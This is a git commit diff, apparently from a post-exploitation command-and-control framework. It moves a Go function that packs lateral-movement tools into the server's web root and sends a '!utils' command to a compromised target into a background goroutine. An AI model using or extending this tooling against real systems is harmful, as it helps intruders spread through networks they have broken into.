51538500241bd8fde1a404cd466322390ba4c1ff
jm33-m0 <jm33@jm33.me>
2022-02-03 15:10:38 +0800

    modvaccine: do not block main thread

--- core/lib/cc/modvaccine.go
+++ core/lib/cc/modvaccine.go
@@ -9,21 +9,23 @@ import (
 // upload a zip file that packs several lateral-movement tools
 // statically linked, built under alpine
 func moduleVaccine() {
-	pwd, _ := os.Getwd()
-	err := os.Chdir(ModuleDir + "/vaccine")
-	if err != nil {
-		CliPrintError("Entering vaccine dir: %v", err)
-		return
-	}
-	defer os.Chdir(pwd)
-	err = util.TarBz2(".", WWWRoot+"utils.tar.bz2")
-	if err != nil {
-		CliPrintError("Creating vaccine archive: %v", err)
-		return
-	}
+	go func() {
+		pwd, _ := os.Getwd()
+		err := os.Chdir(ModuleDir + "/vaccine")
+		if err != nil {
+			CliPrintError("Entering vaccine dir: %v", err)
+			return
+		}
+		defer os.Chdir(pwd)
+		err = util.TarBz2(".", WWWRoot+"utils.tar.bz2")
+		if err != nil {
+			CliPrintError("Creating vaccine archive: %v", err)
+			return
+		}
 
-	err = SendCmd("!utils", "", CurrentTarget)
-	if err != nil {
-		CliPrintError("SendCmd failed: %v", err)
-	}
+		err = SendCmd("!utils", "", CurrentTarget)
+		if err != nil {
+			CliPrintError("SendCmd failed: %v", err)
+		}
+	}()
 }
